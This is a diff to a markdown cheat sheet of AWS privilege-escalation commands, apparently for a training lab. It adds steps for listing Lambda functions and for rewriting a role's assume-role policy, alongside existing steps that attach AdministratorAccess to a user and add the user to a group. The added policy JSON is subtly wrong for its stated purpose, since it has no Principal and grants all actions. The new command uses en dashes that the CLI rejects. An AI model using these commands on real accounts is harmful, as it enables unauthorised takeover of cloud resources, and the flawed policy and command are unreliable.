@@ -41,7 +41,11 @@ unset AWS_SESSION_TOKEN
 `aws configure get region`  
 `curl -s http://169.254.169.254/latest/meta-data/placement/availability-zone | sed 's/\(.*\)[a-z]/\1/'`  
 `ec2-metadata --availability-zone`  
+
+### List Lambda Functions  
  
+`aws lambda list-functions --region us-east-1`  
+
 ## Abuse `iam:AttachUserPolicy` being present  
 `aws iam list-policies | grep 'AdministratorAccess'`  
 `aws iam attach-user-policy --user-name student --policy-arn arn:aws:iam::aws:policy/AdministratorAccess`  
@@ -52,3 +56,21 @@ unset AWS_SESSION_TOKEN
 ## Abuse `iam:AddUserToGroup` being present
 `aws iam add-user-to-group --group-name Printers --user-name student`  
 `aws iam list-groups-for-user --user-name student`  
+
+## Abuse `iam:UpdateAssumeRolePolicy` and `sts:AssumeRole permissions` (change the assume role policy document of any existing role to allow them to assume that role)  
+
+`aws iam update-assume-role-policy –role-name role_i_can_assume –policy-document file://path/to/assume/role/policy.json`  
+
+Where the policy looks like the following, which gives the user permission to assume the role:
+```
+{
+"Version": "2012-10-17",
+"Statement": [
+    {
+  "Effect":"Allow",
+  "Action":"*",
+  "Resource":"*"
+    }
+  ]
+}
+```
